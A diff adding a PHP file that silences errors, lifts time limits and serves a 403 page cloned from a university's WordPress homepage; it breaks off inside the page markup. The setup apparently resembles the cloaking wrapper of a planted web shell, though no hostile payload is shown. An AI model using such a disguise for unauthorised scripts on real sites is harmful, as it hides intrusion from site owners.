@@ -1,31 +1,1223 @@
+<?php
+error_reporting(0);
+set_time_limit(0);
 
+function denied()
+{
+    header("HTTP/1.0 403 Forbidden");
+    echo "
+
+<!DOCTYPE html>
+<html lang='en-US' class='no-js'>
+	<link href='https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap' rel='stylesheet'>
+<head>
+	<meta charset='UTF-8'>
+	<meta name='viewport' content='width=device-width, initial-scale=1'>
+	<link rel='profile' href='http://gmpg.org/xfn/11'>
+		<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
+<title>Universitas Persatuan Islam</title>
+<meta name='robots' content='max-image-preview:large' />
+	<style>img:is([sizes='auto' i], [sizes^='auto,' i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	<link rel='dns-prefetch' href='//platform-api.sharethis.com' />
+<link rel='dns-prefetch' href='//cdnjs.cloudflare.com' />
+<link rel='dns-prefetch' href='//www.googletagmanager.com' />
+<link rel='alternate' type='application/rss+xml' title='Universitas Persatuan Islam &raquo; Feed' href='https://unipi.ac.id/feed/' />
+<link rel='alternate' type='application/rss+xml' title='Universitas Persatuan Islam &raquo; Comments Feed' href='https://unipi.ac.id/comments/feed/' />
+<script type='text/javascript'>
+/* <![CDATA[ */
+window._wpemojiSettings = {'baseUrl':'https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/','ext':'.png','svgUrl':'https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/','svgExt':'.svg','source':{'concatemoji':'https:\/\/unipi.ac.id\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.2'}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case'flag':return n(e,'\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f','\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f')?!1:!n(e,'\ud83c\uddfa\ud83c\uddf3','\ud83c\uddfa\u200b\ud83c\uddf3')&&!n(e,'\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f','\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f');case'emoji':return!n(e,'\ud83d\udc26\u200d\u2b1b','\ud83d\udc26\u200b\u2b1b')}return!1}function f(e,t,n){var r='undefined'!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement('canvas'),a=r.getContext('2d',{willReadFrequently:!0}),o=(a.textBaseline='top',a.font='600 32px Arial',{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement('script');t.src=e,t.defer=!0,i.head.appendChild(t)}'undefined'!=typeof Promise&&(o='wpEmojiSettingsSupports',s=['flag','emoji'],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener('DOMContentLoaded',e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if('object'==typeof e&&'number'==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&'object'==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if('undefined'!=typeof Worker&&'undefined'!=typeof OffscreenCanvas&&'undefined'!=typeof URL&&URL.createObjectURL&&'undefined'!=typeof Blob)try{var e='postMessage('+f.toString()+'('+[JSON.stringify(s),u.toString(),p.toString()].join(',')+'));',r=new Blob([e],{type:'text/javascript'}),a=new Worker(URL.createObjectURL(r),{name:'wpTestEmojiSupports'});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],'flag'!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<link rel='stylesheet' id='pa-frontend-css' href='https://unipi.ac.id/wp-content/uploads/premium-addons-elementor/pa-frontend-0af53dd1e.min.css?ver=1739781978' type='text/css' media='all' />
+<style id='wp-emoji-styles-inline-css' type='text/css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<style id='wppb-edit-profile-style-inline-css' type='text/css'>
+
+
+</style>
+<style id='wppb-login-style-inline-css' type='text/css'>
+
+
+</style>
+<style id='wppb-recover-password-style-inline-css' type='text/css'>
+
+
+</style>
+<style id='wppb-register-style-inline-css' type='text/css'>
+
+
+</style>
+<style id='classic-theme-styles-inline-css' type='text/css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id='global-styles-inline-css' type='text/css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='contact-form-7-css' href='https://unipi.ac.id/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=6.0.3' type='text/css' media='all' />
+<link rel='stylesheet' id='genericons-css' href='https://unipi.ac.id/wp-content/themes/tpg-eschool/genericons/genericons.css?ver=3.4.1' type='text/css' media='all' />
+<link rel='stylesheet' id='ltheme-style-css' href='https://unipi.ac.id/wp-content/themes/tpg-eschool/style.css?ver=6.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='ltheme-block-style-css' href='https://unipi.ac.id/wp-content/themes/tpg-eschool/css/blocks.css?ver=20181230' type='text/css' media='all' />
+<!--[if lt IE 10]>
+<link rel='stylesheet' id='ltheme-ie-css' href='https://unipi.ac.id/wp-content/themes/tpg-eschool/css/ie.css?ver=20160816' type='text/css' media='all' />
+<![endif]-->
+<!--[if lt IE 9]>
+<link rel='stylesheet' id='ltheme-ie8-css' href='https://unipi.ac.id/wp-content/themes/tpg-eschool/css/ie8.css?ver=20160816' type='text/css' media='all' />
+<![endif]-->
+<!--[if lt IE 8]>
+<link rel='stylesheet' id='ltheme-ie7-css' href='https://unipi.ac.id/wp-content/themes/tpg-eschool/css/ie7.css?ver=20160816' type='text/css' media='all' />
+<![endif]-->
+<link rel='stylesheet' id='ltheme-woocommerce-css' href='https://unipi.ac.id/wp-content/themes/tpg-eschool/css/woocommerce.css?ver=20160816' type='text/css' media='all' />
+<link rel='stylesheet' id='ltheme-fontawesome-css' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css?ver=20160816' type='text/css' media='all' />
+<link rel='stylesheet' id='ltheme-custom-layout-css' href='https://unipi.ac.id/wp-content/themes/tpg-eschool/css/custom-layout.css?ver=20160816' type='text/css' media='all' />
+<link rel='stylesheet' id='ltheme-custom-css' href='https://unipi.ac.id/wp-content/themes/tpg-eschool/css/custom.css?ver=20160816' type='text/css' media='all' />
+<link rel='stylesheet' id='ltheme-custom-color-css' href='https://unipi.ac.id/wp-content/themes/tpg-eschool/css/style-color.css?ver=20160816' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-icons-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=5.35.0' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-frontend-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.27.5' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-3126-css' href='https://unipi.ac.id/wp-content/uploads/elementor/css/post-3126.css?ver=1739735049' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-5-all-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/lib/font-awesome/css/all.min.css?ver=4.10.85' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-4-shim-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/lib/font-awesome/css/v4-shims.min.css?ver=3.27.5' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-heading-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/css/widget-heading.min.css?ver=3.27.5' type='text/css' media='all' />
+<link rel='stylesheet' id='e-animation-rubberBand-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/lib/animations/styles/rubberBand.min.css?ver=3.27.5' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-image-box-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/css/widget-image-box.min.css?ver=3.27.5' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-text-editor-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/css/widget-text-editor.min.css?ver=3.27.5' type='text/css' media='all' />
+<link rel='stylesheet' id='pa-btn-css' href='https://unipi.ac.id/wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-css/button-line.min.css?ver=4.10.85' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-image-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/css/widget-image.min.css?ver=3.27.5' type='text/css' media='all' />
+<link rel='stylesheet' id='pa-slick-css' href='https://unipi.ac.id/wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-css/slick.min.css?ver=4.10.85' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-counter-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/css/widget-counter.min.css?ver=3.27.5' type='text/css' media='all' />
+<link rel='stylesheet' id='swiper-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/lib/swiper/v8/css/swiper.min.css?ver=8.4.5' type='text/css' media='all' />
+<link rel='stylesheet' id='e-swiper-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/css/conditionals/e-swiper.min.css?ver=3.27.5' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-image-carousel-css' href='https://unipi.ac.id/wp-content/plugins/elementor/assets/css/widget-image-carousel.min.css?ver=3.27.5' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-3124-css' href='https://unipi.ac.id/wp-content/uploads/elementor/css/post-3124.css?ver=1739735052' type='text/css' media='all' />
+<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=auto&#038;ver=6.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='wppb_stylesheet-css' href='https://unipi.ac.id/wp-content/plugins/profile-builder/assets/css/style-front-end.css?ver=3.13.3' type='text/css' media='all' />
+<link rel='preconnect' href='https://fonts.gstatic.com/' crossorigin><!--n2css--><script>(function(){this._N2=this._N2||{_r:[],_d:[],r:function(){this._r.push(arguments)},d:function(){this._d.push(arguments)}}}).call(window);</script><script src='https://unipi.ac.id/wp-content/plugins/smart-slider-3/Public/SmartSlider3/Application/Frontend/Assets/dist/n2.min.js?ver=fe0c9112' defer async></script>
+<script>
+
+</script><script type='text/javascript' src='https://unipi.ac.id/wp-includes/js/jquery/jquery.min.js?ver=3.7.1' id='jquery-core-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1' id='jquery-migrate-js'></script>
+<!--[if lt IE 9]>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/themes/tpg-eschool/js/html5.js?ver=3.7.3' id='ltheme-html5-js'></script>
+<![endif]-->
+<script type='text/javascript' src='//platform-api.sharethis.com/js/sharethis.js#source=googleanalytics-wordpress#product=ga&amp;property=61fc8b7ed7b259001917a09d' id='googleanalytics-platform-sharethis-js'></script>
+<script type='text/javascript' src='https://unipi.ac.id/wp-content/plugins/elementor/assets/lib/font-awesome/js/v4-shims.min.js?ver=3.27.5' id='font-awesome-4-shim-js'></script>
+<link rel='https://api.w.org/' href='https://unipi.ac.id/wp-json/' /><link rel='alternate' title='JSON' type='application/json' href='https://unipi.ac.id/wp-json/wp/v2/pages/3124' /><link rel='EditURI' type='application/rsd+xml' title='RSD' href='https://unipi.ac.id/xmlrpc.php?rsd' />
+<meta name='generator' content='WordPress 6.7.2' />
+<link rel='canonical' href='https://unipi.ac.id/' />
+<link rel='shortlink' href='https://unipi.ac.id/' />
+<link rel='alternate' title='oEmbed (JSON)' type='application/json+oembed' href='https://unipi.ac.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funipi.ac.id%2F' />
+<link rel='alternate' title='oEmbed (XML)' type='text/xml+oembed' href='https://unipi.ac.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funipi.ac.id%2F&#038;format=xml' />
+<!-- start Simple Custom CSS and JS -->
+<style type='text/css'>
+.site-title {
+  display: none !important;
+}</style>
+<!-- end Simple Custom CSS and JS -->
+	<link rel='preconnect' href='https://fonts.googleapis.com'>
+	<link rel='preconnect' href='https://fonts.gstatic.com'>
+	<link href='https://fonts.googleapis.com/css2?display=swap&family=Poppins:wght@300;500;600;800' rel='stylesheet'><meta name='generator' content='Site Kit by Google 1.146.0' />
+	<style type='text/css'>
+		
+		body {
+			background-color: #ffffff;
+		}
+
+		.top-head {
+			background-color: #009b47;
+		}
+		.top-head,
+		.top-head ul li,
+		.top-head ul li i,
+		.top-head p,
+		.top-head .textwidget {
+			color: #ffffff;
+		}
+		.top-head a {
+			color: #ffffff;
+		}
+
+		.top-head a:hover {
+			color: ;
+		}
+
+
+		header.site-header {
+			background-color: #ffffff;
+		}
+
+		header.site-header.is-sticky {
+			background-color: #ffffff;
+		}
+
+		.main-navigation .primary-menu {
+			color: #1a1a1a;
+		}
+
+		.main-navigation .primary-menu > li > a {
+			color: #1a1a1a;
+		}
+		
+		.main-navigation .primary-menu li li a {
+			color: #1a1a1a;
+		}
+
+		.main-navigation ul ul.sub-menu {
+			background-color: #ffffff;
+		}
+
+		#site-header-menu.toggled-on {
+			background-color: #ffffff;
+		}
+
+
+		body .main-navigation li:hover > a, 
+		body .main-navigation li.focus > a, 
+		body .main-navigation li.current-menu-item > a, 
+		body .main-navigation li.current-menu-parent > a {
+			color: #009b47;
+		}
+
+		.main-footer,
+		.main-footer h2,
+		.main-footer p,
+		.main-footer .textwidget,
+		.main-footer ul li {
+			color: #ffffff;
+		}
+		.main-footer a {
+			color: #ffffff;
+		}
+
+		.main-footer a:hover {
+			color: #fdc800;
+		}
+
+		.main-footer {
+			background-color: #009b47;
+		}
+
+
+		.site-footer,
+		.site-footer p {
+			color: #ffffff;
+		}
+		.site-footer a {
+			color: #fefefe;
+		}
+
+		.site-footer a:hover {
+			color: #ffffff;
+		}
+
+		.site-footer {
+			background-color: #2c624b;
+		}
+
+	</style>
+
+
+<!-- Google AdSense meta tags added by Site Kit -->
+<meta name='google-adsense-platform-account' content='ca-host-pub-2644536267352236'>
+<meta name='google-adsense-platform-domain' content='sitekit.withgoogle.com'>
+<!-- End Google AdSense meta tags added by Site Kit -->
+<meta name='generator' content='Elementor 3.27.5; features: additional_custom_breakpoints; settings: css_print_method-external, google_font-enabled, font_display-auto'>
+			<style>
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * {
+					background-image: none !important;
+				}
+				@media screen and (max-height: 1024px) {
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+				@media screen and (max-height: 640px) {
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+			</style>
+			<link rel='icon' href='https://unipi.ac.id/wp-content/uploads/2020/07/cropped-logo-1-32x32.png' sizes='32x32' />
+<link rel='icon' href='https://unipi.ac.id/wp-content/uploads/2020/07/cropped-logo-1-192x192.png' sizes='192x192' />
+<link rel='apple-touch-icon' href='https://unipi.ac.id/wp-content/uploads/2020/07/cropped-logo-1-180x180.png' />
+<meta name='msapplication-TileImage' content='https://unipi.ac.id/wp-content/uploads/2020/07/cropped-logo-1-270x270.png' />
+		<style type='text/css' id='wp-custom-css'>
+			.wpem-main.wpem-single-event-widget {
+	    padding: 10px;
+}
+.wpem-main.wpem-single-event-widget {
+	width: 48%;
+	float: left;
+	margin: 1%;
+}
+.wpem-event-infomation {
+	    width: 70%;
+    display: inline-block;
+}
+.wpem-event-date-time {
+	margin-bottom: 0;
+}
+.wpem-event-details > a {
+	    width: 100% !important;
+    box-shadow: none !important;
+}
+.wpem-main.wpem-single-event-widget > a {
+    display: inline-block;
+    width: 28%;
+    margin-right: 2%;
+    float: left;
+}
+a.wpem-event-action-url.event-widget {
+    width: 28%;
+}
+.wpem-main.wpem-single-event-widget > a,
+.wpem-event-details > a, .wpem-event-type > a, .wpem-event-infomation {
+	  margin: 0 !important;
+    padding: 0 !important;
+}
+.wpem-event-infomation {
+	padding: 0;
+}
+.wpem-event-infomation > a {
+	display: none;
+}
+body .wpem-event-details {
+	padding-left: 10px;
+}
+body .wpem-event-details > a,
+.wpem-event-type > a {
+	width: 100%;
+    margin: 0;
+}
+@media(max-width: 768px) {
+	.wpem-main.wpem-single-event-widget {
+	width: 98%;
+	float: left;
+	margin: 1%;
+}
+}
+
+.footer-contacts li * {
+	color: #fff;
+}		</style>
+			<style id='egf-frontend-styles' type='text/css'>
+		p {font-family: 'Poppins', sans-serif;font-style: normal;font-weight: 300;} h1 {font-family: 'Poppins', sans-serif;font-style: normal;font-weight: 800;} h2 {font-family: 'Poppins', sans-serif;font-style: normal;font-weight: 600;} h3 {font-family: 'Poppins', sans-serif;font-style: normal;font-weight: 600;} h4 {font-family: 'Poppins', sans-serif;font-style: normal;font-weight: 600;} h5 {font-family: 'Poppins', sans-serif;font-style: normal;font-weight: 500;} h6 {font-family: 'Poppins', sans-serif;font-style: normal;font-weight: 500;} a, link, li, main-navigation, label, button, select, comment-reply-title, input, dt, th, td, span, form, div {font-family: 'Poppins', sans-serif;font-style: normal;font-weight: 500;} 	</style>
+		
+</head>
+
+<body class='home page-template page-template-elementor_header_footer page page-id-3124 wp-custom-logo wp-embed-responsive elementor-default elementor-template-full-width elementor-kit-3126 elementor-page elementor-page-3124'>
+<div id='page' class='site'>
+	<!-- Head Top -->
+	<div class='top-head'>
+		<div class='container'>
+
+			
+				 <div id='header-widget-area' class='head-left chw-widget-area widget-area' role='complementary'>
+
+						<div class='widget_text head-left-custom''><div class='textwidget custom-html-widget'><ul>
+	<li class='fa fa-headphones'><a>081222699980</a></li>
+	<li class='fa fa-map'><a>Jl. Peta 154 Bojongloa Kaler, Bandung
+		</a></li>
+</ul></div></div>
+				 </div>
+
+						
+				 <div id='header-widget-area' class='head-right chw-widget-area widget-area' role='complementary'>
+
+						<div class='widget_text head-left-custom'><div class='textwidget custom-html-widget'></div></div>				 </div>
+					</div>
+	</div>
+	<!-- End Top menu -->
+	<header id='masthead' class='site-header' role='banner'>
+
+
+
+			<div class='site-header-main'>
+				<div class='site-branding'>
+					<a href='https://unipi.ac.id/' class='custom-logo-link' rel='home' aria-current='page'><img width='220' height='60' src='https://unipi.ac.id/wp-content/uploads/2021/01/logo-fc-2021.png' class='custom-logo' alt='unipi logo' decoding='async' /></a>
+											<p class='site-title'><a href='https://unipi.ac.id/' rel='home'>Universitas Persatuan Islam</a></p>
+										
+				</div><!-- .site-branding -->
+
+									<button id='menu-toggle' class='menu-toggle'>Menu</button>
+
+					<div id='site-header-menu' class='site-header-menu'>
+													<nav id='site-navigation' class='main-navigation' role='navigation' aria-label='Primary Menu'>
